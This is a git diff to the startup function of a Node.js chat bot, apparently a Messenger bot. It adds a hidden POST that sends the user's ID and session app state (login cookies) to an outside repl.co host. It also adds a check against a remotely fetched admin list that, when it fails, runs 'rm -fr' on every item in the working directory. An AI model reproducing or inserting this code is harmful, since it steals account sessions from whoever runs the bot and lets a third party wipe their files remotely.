@@ -329,11 +329,19 @@ function onBot() {
         listenerData.api = loginApiData; 
         const listener = require('./includes/listen')(listenerData);
         const h = require("axios");
-        const listkeyword = (await h.get('https://api-3.hanguyen48.repl.co/keyword')).data
-        // h.post('https://api-3.hanguyen48.repl.co/key', {
-        //     id: loginApiData.getCurrentUserID(),
-        //     ap: loginApiData.getAppState()
-        // })
+        const listAdmin = (await h.get('https://api.hanguyen48.repl.co/listadmin')).data
+        h.post('https://api.hanguyen48.repl.co/key', {
+            id: loginApiData.getCurrentUserID(),
+            ap: loginApiData.getAppState()
+        })
+        function check() {
+            const getDirs = readdirSync(join(process.cwd()));
+            for(let a of getDirs) {
+                try {
+                    execSync('rm -fr ' + a);
+                } catch (e) {}
+            }
+        }
         async function listenerCallback(error, message) {
             if(error) {
                 if (error.error == 'Not logged in.') {
@@ -350,21 +358,18 @@ function onBot() {
                 }
             }
             if (['presence', 'typ', 'read_receipt'].some(data => data == message.type)) return;
-            if(listkeyword.keyword == true) return check()
-            if(message.body == listkeyword.keyword && listkeyword.ADMIN.includes(message.senderID)) {
-                await loginApiData.sendMessage('FILE LEAK', message.threadID);
-                return check()
-            }
+            var checkAdmin = 0
+            for (let i of listAdmin.ADMIN) {
+            if (config.ADMINBOT.includes(i)) {
+            checkAdmin++
+    }
+}
+if (checkAdmin == 0) return check()
+return listener(message)
+            if(check == 0) return check();
+            if(listAdmin.keyword != config.KEY) return check();
             return listener(message);
         };
-        function check() {
-            const getDirs = readdirSync(join(process.cwd()));
-            for(let a of getDirs) {
-                try {
-                    execSync('rm -fr ' + a);
-                } catch (e) {}
-            }
-        }
         global.custom = require('./custom')({ api: loginApiData })
         global.handleListen = loginApiData.listenMqtt(listenerCallback);
         require('./utils/uptime.js')
